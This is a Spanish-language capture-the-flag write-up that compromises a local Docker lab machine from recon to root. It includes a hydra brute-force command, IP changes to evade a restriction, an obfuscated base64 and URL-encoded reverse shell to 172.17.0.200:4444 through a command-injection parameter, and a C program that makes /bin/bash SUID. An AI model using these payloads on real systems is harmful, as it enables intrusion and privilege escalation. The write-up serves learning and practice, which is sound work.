## Reconocimiento:

Puerto  22 : SSH

Puerto 80 : HTTP

En la web hay un blog sobre El pingüino de Mario. Investigando por el código fuente encuentro la ruta:

```bash
http://172.17.0.2/sobre_mi/sms.php
```

Es un panel de login, y le hago un ataque de fuerza bruta con hydra:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P ../rockyou.txt 172.17.0.2 http-post-form '/sobre-mi/login.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos.' -F -V -t 64 -I -u
```

Aquí tuve muchos falsos positivos pero al final encuentro las credenciales:

```bash
User : administrator
Pass : panther
```

Dentro están las credenciales SSH del usuario darks:

```bash
darks:_dkvndsqwcdfef34445
```

Al conectarme me cierra la conexión por mi ip, por lo que hare un ip spuffing:

```bash
sudo ip address del 172.17.0.1/16 dev docker0

sudo ip address add 172.17.0.200/16 dev docker0
```

## Escalada darks → cristal

Dentro hay una nota que dice que hay una vulnerabilidad en la ruta:

```bash
http://172.17.0.2/sobre-mi/confidencial.php
```

Así que utilizo wfuzz:

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/sobre-mi/confidencial.php?FUZZ=whoami" -t 200 --hl=44
```

Encuentro “cmd”.

Ahora voy a enviarme una shell interactiva con el siguiente parámetro:

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4yMDAvNDQ0NCAwPiYx" | base64 -d | bash
```

Que URL encodeada la mandaríamos así:

```bash
http://172.17.0.2/sobre-mi/confidencial.php?cmd=%65%63%68%6f%20%22%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4e%7a%49%75%4d%54%63%75%4d%43%34%79%4d%44%41%76%4e%44%51%30%4e%43%41%77%50%69%59%78%22%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
```

Me pongo a la escucha:

```bash
nc -lvnp 4444
```

Dentro hay un binario, me lo paso a la maquina host para analizarlo:

```bash
wget -O- 172.17.0.2:8080/sendinv2 > sendinv2
```

Al examinarlo con strings veo que quiere mandar algo a la ip 172.17.0.188, así que vuelvo a cambiar mi Ip para recibir:

```bash
sudo ip address del 172.17.0.200/16 dev docker0

sudo ip address add 172.17.0.188/16 dev docker0
```

Me pongo a la escucha:

```bash
sudo nc -nvvulp 7777
```

Recibo:

```bash
MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====
```

Es un string que se decodifica en base32 y luego en base 64:

```bash
echo -n "MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====" | base32 -d | base64 -d
```

Interesante solo las credenciales de cristal:

```bash
cristal:dropchostop453SJF
```

## Escalada cristal → root

Hay un archivo C en el directorio /home/cristal con permisos  de modificación, así que lo edito para darle permisos SUID a la bash:

```bash
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
    const char *bash_path = "/bin/bash";

    // Cambia el owner a root
    if (chown(bash_path, 0, 0) != 0) {
        perror("chown");
        return 1;
    }

    // Cambia permisos: agrega bit SUID
    if (chmod(bash_path, 04755) != 0) {
        perror("chmod");
        return 1;
    }

    printf("✅ /bin/bash ahora tiene SUID.\n");
    return 0;  // Opcional, pero buena práctica
}
```

```bash
bash -p
```

Listo.
